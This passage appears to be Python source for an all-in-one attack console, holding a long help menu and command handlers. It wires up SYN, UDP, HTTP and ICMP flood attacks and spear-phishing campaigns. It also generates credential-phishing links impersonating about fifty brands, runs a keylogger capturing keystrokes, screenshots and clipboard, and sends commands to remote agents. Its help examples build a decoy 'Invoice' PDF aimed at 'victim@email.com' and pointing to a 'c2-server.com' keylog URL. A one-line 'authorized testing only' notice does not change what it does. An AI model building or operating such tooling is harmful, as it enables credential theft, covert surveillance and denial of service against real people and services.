║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.SUCCESS}🕷️ NIKTO COMMANDS:{Colors.RESET}
║  nikto <target>                - Web vulnerability scan
║  nikto_full <target>           - Full scan with all tests
║  nikto_ssl <target>            - SSL/TLS scan
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood attack
║  dos_udp <ip> <port> <duration> [threads] - UDP flood attack
║  dos_http <ip> <port> <duration> [threads] - HTTP flood attack
║  dos_icmp <ip> <duration> [threads] - ICMP flood attack
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.SUCCESS}🎣 SPEAR PHISHING:{Colors.RESET}
║  spear_create <name> <subject> <from> <template> <targets> - Create campaign
║  spear_send <campaign_id>      - Send campaign
║  spear_list                    - List all campaigns
║
║{Colors.SUCCESS}🤖 AGENT COMMANDS:{Colors.RESET}
║  agent_register <name> <ip>    - Register new agent
║  agent_command <id> <command>  - Send command to agent
║  agent_list                    - List all agents
║  agent_status <id>            - Check agent status
║
║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
║  netmon_start                  - Start network monitoring
║  netmon_stop                   - Stop network monitoring
║  netmon_status                 - Show monitoring status
║  netmon_packets [limit]        - Show captured packets
║
║{Colors.SUCCESS}⌨️ ADVANCED KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.SUCCESS}📦 DEPLOYMENT ENGINE:{Colors.RESET}
║  deploy_pdf <name> <target> <url> - Create PDF with keylogger link
║  deploy_email <name> <target> <subject> <body> <url> - Create email payload
║  deploy_link <name> <target> <url> - Create direct link payload
║  deploy_executable <name> <target> <server> - Create executable payload
║  deploy_list                  - List all deployments
║  deploy_track <id>            - Track deployment open
║
║{Colors.SUCCESS}🌐 DOMAIN HOSTING:{Colors.RESET}
║  ip_to_domain <ip>            - Translate IP to domain
║  domain_to_ip <domain>        - Translate domain to IP
║  host_domain <ip> <domain> [port] - Host a domain
║  host_website <domain> <html_file> - Host a website
║  list_domains                 - List hosted domains
║  domain_info <domain>         - Domain information
║
║{Colors.SUCCESS}🎣 PHISHING COMMANDS:{Colors.RESET}
║  phish <platform>             - Generate phishing link for a platform
║  phish_facebook               - Generate Facebook phishing link
║  phish_instagram              - Generate Instagram phishing link
║  phish_twitter                - Generate Twitter phishing link
║  phish_gmail                  - Generate Gmail phishing link
║  phish_linkedin               - Generate LinkedIn phishing link
║  phish_microsoft              - Generate Microsoft phishing link
║  phish_google                 - Generate Google phishing link
║  phish_apple                  - Generate Apple phishing link
║  phish_paypal                 - Generate PayPal phishing link
║  phish_amazon                 - Generate Amazon phishing link
║  phish_netflix                - Generate Netflix phishing link
║  phish_spotify                - Generate Spotify phishing link
║  phish_whatsapp               - Generate WhatsApp phishing link
║  phish_telegram               - Generate Telegram phishing link
║  phish_discord                - Generate Discord phishing link
║  phish_tiktok                 - Generate TikTok phishing link
║  phish_snapchat               - Generate Snapchat phishing link
║  phish_reddit                 - Generate Reddit phishing link
║  phish_github                 - Generate GitHub phishing link
║  phish_gitlab                 - Generate GitLab phishing link
║  phish_protonmail             - Generate ProtonMail phishing link
║  phish_yahoo                  - Generate Yahoo phishing link
║  phish_slack                  - Generate Slack phishing link
║  phish_zoom                   - Generate Zoom phishing link
║  phish_teams                  - Generate Teams phishing link
║  phish_wordpress              - Generate WordPress phishing link
║  phish_shopify                - Generate Shopify phishing link
║  phish_steam                  - Generate Steam phishing link
║  phish_roblox                 - Generate Roblox phishing link
║  phish_twitch                 - Generate Twitch phishing link
║  phish_epic_games             - Generate Epic Games phishing link
║  phish_minecraft              - Generate Minecraft phishing link
║  phish_xbox                   - Generate Xbox phishing link
║  phish_playstation            - Generate PlayStation phishing link
║  phish_cashapp                - Generate Cash App phishing link
║  phish_venmo                  - Generate Venmo phishing link
║  phish_chase                  - Generate Chase phishing link
║  phish_wells_fargo            - Generate Wells Fargo phishing link
║  phish_office365              - Generate Office 365 phishing link
║  phish_onedrive               - Generate OneDrive phishing link
║  phish_icloud                 - Generate iCloud phishing link
║  phish_adobe                  - Generate Adobe phishing link
║  phish_dropbox                - Generate Dropbox phishing link
║  phish_pinterest              - Generate Pinterest phishing link
║  phish_duolingo               - Generate Duolingo phishing link
║  phish_onlyfans               - Generate OnlyFans phishing link
║  phish_bumble                 - Generate Bumble phishing link
║  phish_tinder                 - Generate Tinder phishing link
║  phish_custom                 - Generate custom phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_status                  - Check phishing server status
║  phish_creds [link_id]         - View captured credentials
║  phish_list                    - List all phishing links
║
║{Colors.SUCCESS}🛡️ NETWORK COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace network path
║  whois <domain>                - WHOIS lookup
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  location <ip>                 - IP geolocation
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips [active]             - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}💻 WEB TERMINAL:{Colors.RESET}
║  web_start [port]              - Start web terminal
║  web_stop                      - Stop web terminal
║  web_status                    - Web terminal status
║
║{Colors.SUCCESS}🤖 PLATFORM BOT COMMANDS:{Colors.RESET}
║  discord_start                 - Start Discord bot
║  discord_stop                  - Stop Discord bot
║  telegram_start                - Start Telegram bot
║  telegram_stop                 - Stop Telegram bot
║  slack_start                   - Start Slack bot
║  slack_stop                    - Stop Slack bot
║  signal_start                  - Start Signal bot
║  signal_stop                   - Stop Signal bot
║  whatsapp_start                - Start WhatsApp bot
║  whatsapp_stop                 - Stop WhatsApp bot
║  platform_status               - Show all platform statuses
║  platform_list                 - List all available platforms
║
║{Colors.SUCCESS}🐍 PYTHON COMMANDS:{Colors.RESET}
║  python <code>                 - Execute Python code
║  python3 <code>                - Execute Python 3 code
║  py <code>                     - Execute Python code
║  pip <command>                 - Run pip command
║  pip3 <command>                - Run pip3 command
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  threats [limit]               - Recent threats
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║  exit                          - Exit the tool
║  quit                          - Exit the tool
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 8.8.8.8
║  nmap_quick 192.168.1.1
║  curl https://example.com
║  traffic icmp 192.168.1.1 10
║  nikto example.com
║  dos_syn 192.168.1.100 80 30 100
║  keylogger_start
║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
║  deploy_link "Update" "user@email.com" "http://c2-server.com/download"
║  ip_to_domain 8.8.8.8
║  domain_to_ip google.com
║  host_domain 192.168.1.100 mydomain.local 8080
║  phish_facebook
║  phish_start <link_id>
║  phish_creds
║  add_ip 192.168.1.100 Suspicious
║  analyze_ip 8.8.8.8
║  python print("Hello")
║  pip install requests
║  discord_start
║  platform_status
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}
    
    # ==================== Ping Commands ====================
    def _ping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        target = args[0]
        count = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
        result = self.tools.ping(target, count)
        return {'success': result.success, 'output': result.output}
    
    def _ping6(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping6 <target>'}
        target = args[0]
        result = self._generic([f'ping6 -c 4 {target}'])
        return result
    
    def _ping_sweep(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: ping_sweep <network> (e.g., 192.168.1.0/24)'}
        network = args[0]
        result = self._generic([f'nmap -sn {network}'])
        return result
    
    def _fping(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: fping <targets...>'}
        targets = ' '.join(args)
        result = self._generic([f'fping {targets}'])
        return result
    
    # ==================== Nmap Commands ====================
    def _nmap(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        target = args[0]
        options = ' '.join(args[1:]) if len(args) > 1 else ''
        result = self.tools.nmap(target)
        return {'success': result.success, 'output': result.output}
    
    def _nmap_quick(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_quick <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'quick')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_full(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_full <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'full')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_os(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_os <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'os')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_service(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_service <target>'}
        target = args[0]
        result = self.tools.nmap(target, 'service')
        return {'success': result.success, 'output': result.output}
    
    def _nmap_udp(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_udp <target>'}
        target = args[0]
        result = self._generic([f'nmap -sU {target}'])
        return result
    
    def _nmap_vuln(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_vuln <target>'}
        target = args[0]
        result = self._generic([f'nmap --script vuln {target}'])
        return result
    
    def _nmap_stealth(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nmap_stealth <target>'}
        target = args[0]
        result = self._generic([f'nmap -sS -T2 {target}'])
        return result
    
    # ==================== Curl Commands ====================
    def _curl(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        url = args[0]
        result = self.tools.curl(url, 'OPTIONS')
        return {'success': result.success, 'output': result.output}
    
    # ==================== Netcat Commands ====================
    def _netcat(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port> [command]'}
        host = args[0]
        port = int(args[1])
        command = args[2] if len(args) > 2 else None
        result = self.tools.netcat(host, port, command)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic([f'nc -lvp {port}'])
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic([f'nc -zv {host} {ports}'])
        return result
    
    # ==================== SSH Commands ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    # ==================== Traffic Generation ====================
    def _traffic(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    # ==================== Nikto Commands ====================
    def _nikto(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto <target>'}
        target = args[0]
        result = self.nikto.scan(target)
        if result['success']:
            output = f"🕷️ Nikto scan of {target} completed in {result['scan_time']:.1f}s\n"
            output += f"Vulnerabilities found: {len(result['vulnerabilities'])}\n"
            for v in result['vulnerabilities'][:5]:
                desc = v.get('description', '')[:100]
                output += f"  • {desc}\n"
            return {'success': True, 'output': output}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_full(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_full <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'tuning': '123456789', 'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"Full Nikto scan completed: {len(result['vulnerabilities'])} vulnerabilities found"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    def _nikto_ssl(self, args: List[str]) -> Dict:
        if not self.nikto:
            return {'success': False, 'output': 'Nikto scanner not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: nikto_ssl <target>'}
        target = args[0]
        result = self.nikto.scan(target, {'ssl': True})
        if result['success']:
            return {'success': True, 'output': f"SSL/TLS scan completed: {len(result['vulnerabilities'])} findings"}
        return {'success': False, 'output': f"Scan failed: {result.get('error', 'Unknown error')}"}
    
    # ==================== DOS Attacks ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Spear Phishing ====================
    def _spear_create(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: spear_create <name> <subject> <from> <template_file> <targets_file>'}
        name = args[0]
        subject = args[1]
        from_email = args[2]
        template_file = args[3]
        targets_file = args[4]
        
        try:
            with open(template_file, 'r') as f:
                template = f.read()
            with open(targets_file, 'r') as f:
                targets = json.load(f)
            
            campaign = self.spear.create_campaign(name, template, subject, from_email, targets)
            return {'success': True, 'output': f"Campaign created: {campaign.id} - {campaign.name}"}
        except Exception as e:
            return {'success': False, 'output': f"Failed to create campaign: {e}"}
    
    def _spear_send(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: spear_send <campaign_id>'}
        campaign_id = args[0]
        result = self.spear.send_campaign(campaign_id)
        return {'success': result.get('success', False), 'output': f"Sent {result.get('sent_count', 0)} emails"}
    
    def _spear_list(self, args: List[str]) -> Dict:
        if not self.spear:
            return {'success': False, 'output': 'Spear phishing engine not initialized'}
        campaigns = self.spear.get_campaigns()
        if not campaigns:
            return {'success': True, 'output': 'No campaigns found'}
        output = "Spear Phishing Campaigns:\n"
        for c in campaigns:
            output += f"  • {c['id']} - {c['name']} ({c['status']}) - Sent: {c['sent_count']}\n"
        return {'success': True, 'output': output}
    
    # ==================== Agent Commands ====================
    def _agent_register(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_register <name> <ip>'}
        name = args[0]
        ip = args[1]
        result = self.agent.register_agent(name, ip)
        return {'success': result.get('success', False), 'output': result.get('message', '')}
    
    def _agent_command(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: agent_command <agent_id> <command>'}
        agent_id = args[0]
        command = ' '.join(args[1:])
        success = self.agent.send_command(agent_id, command)
        return {'success': success, 'output': f"Command sent to agent {agent_id}" if success else "Failed to send command"}
    
    def _agent_list(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        agents = self.agent.get_agents()
        if not agents:
            return {'success': True, 'output': 'No agents registered'}
        output = "Registered Agents:\n"
        for a in agents:
            status = "🟢" if a.get('status') == 'online' else "🔴"
            output += f"  {status} {a['id']} - {a['name']} ({a.get('ip_address', 'unknown')})\n"
            output += f"     Last heartbeat: {a.get('last_heartbeat', 'Never')}\n"
        return {'success': True, 'output': output}
    
    def _agent_status(self, args: List[str]) -> Dict:
        if not self.agent:
            return {'success': False, 'output': 'Agent engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: agent_status <agent_id>'}
        agent = self.agent.get_agent(args[0])
        if not agent:
            return {'success': False, 'output': f"Agent {args[0]} not found"}
        return {'success': True, 'output': json.dumps(agent, indent=2)}
    
    # ==================== Network Monitor ====================
    def _netmon_start(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.start()
        return {'success': True, 'output': 'Network monitor started'}
    
    def _netmon_stop(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        self.network_monitor.stop()
        return {'success': True, 'output': 'Network monitor stopped'}
    
    def _netmon_status(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        stats = self.network_monitor.get_statistics()
        output = f"Network Monitor Status:\n"
        output += f"  Running: {self.network_monitor.running}\n"
        output += f"  Interface: {self.network_monitor.interface}\n"
        output += f"  Promiscuous: {self.network_monitor.promiscuous}\n"
        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
        output += f"\nTraffic Statistics:\n"
        for proto, count in stats.get('protocols', {}).items():
            output += f"  {proto}: {count}\n"
        return {'success': True, 'output': output}
    
    def _netmon_packets(self, args: List[str]) -> Dict:
        if not self.network_monitor:
            return {'success': False, 'output': 'Network monitor not initialized'}
        limit = int(args[0]) if args else 20
        packets = self.network_monitor.get_packets(limit)
        if not packets:
            return {'success': True, 'output': 'No packets captured'}
        output = f"Recent Packets ({len(packets)}):\n"
        for p in packets:
            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
        return {'success': True, 'output': output}
    
    # ==================== Keylogger ====================
    def _keylogger_start(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args: List[str]) -> Dict:
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_clipboard(self, args: List[str]) -> Dict:
        limit = int(args[0]) if args else 20
        clipboard = self.db.get_clipboard_history(limit)
        if not clipboard:
            return {'success': True, 'output': 'No clipboard history'}
        output = "Clipboard History:\n"
        for c in clipboard:
            output += f"  [{c['timestamp'][:19]}] {c['content'][:100]}\n"
        return {'success': True, 'output': output}
    
    # ==================== Deployment Commands ====================
    def _deploy_pdf(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_pdf <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_pdf_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"PDF deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_email(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 5:
            return {'success': False, 'output': 'Usage: deploy_email <name> <target> <subject> <body> <keylog_url>'}
        name = args[0]
        target = args[1]
        subject = args[2]
        body = args[3]
        keylog_url = args[4]
        deployment = self.deployment.create_email_payload(name, target, subject, body, keylog_url)
        return {
            'success': True,
            'output': f"Email deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_link(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_link <name> <target> <keylog_url>'}
        name = args[0]
        target = args[1]
        keylog_url = args[2]
        deployment = self.deployment.create_link_payload(name, target, keylog_url)
        return {
            'success': True,
            'output': f"Link deployment created: {deployment.id}\nURL: {deployment.payload}",
            'data': {'id': deployment.id, 'url': deployment.payload}
        }
    
    def _deploy_executable(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: deploy_executable <name> <target> <keylog_server>'}
        name = args[0]
        target = args[1]
        keylog_server = args[2]
        deployment = self.deployment.create_executable_payload(name, target, keylog_server)
        return {
            'success': True,
            'output': f"Executable deployment created: {deployment.id}\nFile: {deployment.payload}",
            'data': {'id': deployment.id, 'path': deployment.payload}
        }
    
    def _deploy_list(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        deployments = self.deployment.get_deployments()
        if not deployments:
            return {'success': True, 'output': 'No deployments found'}
        output = "Deployments:\n"
        for d in deployments:
            status = "📄" if d['delivered'] else "⏳"
            output += f"  {status} {d['id']} - {d['name']} ({d['type']})\n"
            output += f"     Target: {d['target']}\n"
            output += f"     Opened: {d['opened']}, Executed: {d['executed']}\n"
        return {'success': True, 'output': output}
    
    def _deploy_track(self, args: List[str]) -> Dict:
        if not self.deployment:
            return {'success': False, 'output': 'Deployment engine not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: deploy_track <deployment_id>'}
        deployment_id = args[0]
        self.deployment.track_opened(deployment_id)
        return {'success': True, 'output': f"Tracked open for deployment {deployment_id}"}
    
